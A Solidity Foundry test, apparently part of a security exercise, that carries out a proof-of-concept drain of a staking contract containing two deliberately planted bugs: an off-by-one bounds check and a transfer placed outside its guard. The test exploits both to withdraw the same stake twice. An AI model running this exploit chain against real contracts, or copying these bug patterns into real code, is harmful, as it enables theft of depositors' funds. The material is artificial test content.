// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {console} from "forge-std/console.sol";

import {IStaking} from "src/interfaces/IStaking.sol";
import {Staking} from "src/Staking/Staking.sol";
import {MockERC20} from "src/mocks/MockERC20.sol";
import {BaseTest} from "test/helpers/BaseTest.sol";

/// @notice Proof-of-concept for the two planted bugs in StakingPlanted.sol:
///
///   BUG-1 (_getUserStakeStorage): uses `stakeId > length` instead of `stakeId >= length`,
///          so passing `stakeId == _userStakes[user].length` clears the bounds-check and
///          returns a zeroed-out storage Stake (amount=0, withdrawn=false, unlockTime=0).
///
///   BUG-2 (unstake): `stakingToken.safeTransfer(msg.sender, amount)` sits OUTSIDE the
///          `if (_userActiveStakeCount[msg.sender] > 0)` guard, so when count==0 the
///          real `amount` is still transferred but `userStake.withdrawn` is never flipped
///          to true, enabling repeated free withdrawals.
///
///   EXPLOIT CHAIN:
///     Step 1 — call emergencyUnstake(phantomId) where phantomId == array length.
///              The zeroed phantom Stake has amount=0, so no tokens leave the contract,
///              but _userActiveStakeCount is decremented from 1 → 0.
///     Step 2 — call unstake(realStakeId) repeatedly.
///              Because count==0 the if-guard is skipped: withdrawn stays false and
///              the transfer fires on every call, draining the contract.
contract PlantPocTest is BaseTest {
    uint128 internal constant STAKE_AMOUNT = 100 ether;
    uint32 internal constant MULTIPLIER_1X = 10_000; // 1× boost (no inflation)

    MockERC20 internal token;
    Staking internal staking;
    uint8 internal tierId;

    function setUp() public override {
        super.setUp();

        token = deployMockToken("STK", 18);

        vm.startPrank(owner);
        // 10 % early-exit penalty
        staking = new Staking(IERC20(address(token)), address(token), 1_000);
        tierId = staking.setLockTier(30 days, MULTIPLIER_1X);

        // Pre-fund the contract with victim liquidity (simulates other depositors)
        token.mint(owner, 1_000 ether);
        token.approve(address(staking), type(uint256).max);
        staking.stake(500 ether, tierId); // victim stake – 500 STK locked
        vm.stopPrank();

        // Give the attacker enough tokens for one stake
        mintAndApprove(token, alice, address(staking), STAKE_AMOUNT);
    }

    /// @notice Full end-to-end drain PoC.
    function test_poc_drainViaPhantomEmergencyUnstake() public {
        // ── Step 0: attacker stakes 100 STK ────────────────────────────────────
        vm.prank(alice);
        uint256 realStakeId = staking.stake(STAKE_AMOUNT, tierId); // stakeId == 0

        assertEq(staking.getActiveStakeCount(alice), 1, "count should be 1 after stake");

        // Snapshot contract balance before any manipulation
        uint256 contractBalanceBefore = token.balanceOf(address(staking));
        uint256 aliceBalanceBefore = token.balanceOf(alice);

        console.log("=== initial state ===");
        console.log("contract balance  :", contractBalanceBefore);
        console.log("alice balance     :", aliceBalanceBefore);
        console.log("alice activeCount :", staking.getActiveStakeCount(alice));

        // ── Step 1: trigger BUG-1 ───────────────────────────────────────────────
        // phantomId == _userStakes[alice].length == 1.
        // _getUserStakeStorage checks `stakeId > length` (should be `>=`), so 1 > 1
        // evaluates to false — no revert.  The storage slot at index 1 is uninitialised:
        //   • amount       == 0
        //   • boostedAmount== 0
        //   • withdrawn    == false  ← passes the withdrawn check
        //   • unlockTime   == 0      ← still locked? No — emergencyUnstake has no lock check
        // Result: _userActiveStakeCount[alice] is decremented 1 → 0 with zero tokens moved.
        uint256 phantomId = staking.getUserStakes(alice).length; // == 1
        vm.prank(alice);
        staking.emergencyUnstake(phantomId);

        assertEq(staking.getActiveStakeCount(alice), 0, "count must be 0 after phantom emergencyUnstake");

        // Real stake at index 0 must still be alive
        IStaking.Stake memory realStake = staking.getUserStake(alice, realStakeId);
        assertFalse(realStake.withdrawn, "real stake must NOT be withdrawn");

        console.log("=== after phantom emergencyUnstake ===");
        console.log("alice activeCount :", staking.getActiveStakeCount(alice));
        console.log("realStake.withdrawn:", realStake.withdrawn);

        // ── Step 2: wait for the lock to expire ────────────────────────────────
        warp(31 days);

        // ── Step 3: trigger BUG-2 — first free withdrawal ──────────────────────
        // count==0  →  if-guard skipped  →  withdrawn never set  →  transfer fires
        vm.prank(alice);
        staking.unstake(realStakeId);

        uint256 aliceAfterFirst = token.balanceOf(alice);
        assertEq(
            aliceAfterFirst - aliceBalanceBefore,
            STAKE_AMOUNT,
            "alice should recover her full stake on first unstake"
        );

        // Confirm withdrawn is STILL false (the if-guard was bypassed)
        realStake = staking.getUserStake(alice, realStakeId);
        assertFalse(realStake.withdrawn, "withdrawn must still be false - BUG-2 active");

        console.log("=== after first unstake ===");
        console.log("alice gained      :", aliceAfterFirst - aliceBalanceBefore);
        console.log("realStake.withdrawn:", realStake.withdrawn);

        // ── Step 4: drain again — second free withdrawal with the SAME stakeId ──
        vm.prank(alice);
        staking.unstake(realStakeId);

        uint256 aliceAfterSecond = token.balanceOf(alice);
        assertEq(
            aliceAfterSecond - aliceAfterFirst,
            STAKE_AMOUNT,
            "alice drains ANOTHER 100 STK on second unstake - double-spend confirmed"
        );

        console.log("=== after second unstake (double-spend) ===");
        console.log("alice total gained:", aliceAfterSecond - aliceBalanceBefore);
        console.log("contract drained  :", contractBalanceBefore - token.balanceOf(address(staking)));

        // Total stolen > original stake: attacker got 200 STK for a 100 STK deposit
        assertGt(
            aliceAfterSecond - aliceBalanceBefore,
            STAKE_AMOUNT,
            "attacker extracted more than she deposited"
        );
    }
}
